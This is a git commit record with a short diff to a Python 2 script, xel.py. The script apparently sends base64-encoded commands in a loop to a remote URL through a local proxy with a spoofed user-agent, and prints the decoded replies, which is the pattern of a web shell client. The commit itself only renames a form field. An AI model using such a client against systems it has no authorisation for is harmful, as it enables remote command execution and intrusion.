cbdd9d9f6511f437ab0c74092f692e704872ab49
HXT <gh0stsync.rt@gmail.com>
2018-11-19 07:57:38 +0700

    Update xel.py

--- xel.py
+++ xel.py
@@ -12,6 +12,6 @@ while True:
     encoded = base64.b64encode(comm)
     headers = {'user-agent':'Mozilla/4.0'}
     proxy = {'http':'http://127.0.0.1:8080'}
-    data = {'xexl':encoded}
+    data = {'xex':encoded}
     r=requests.post(url, headers=headers, proxies=proxy, data=data)
     print base64.b64decode(r.text)
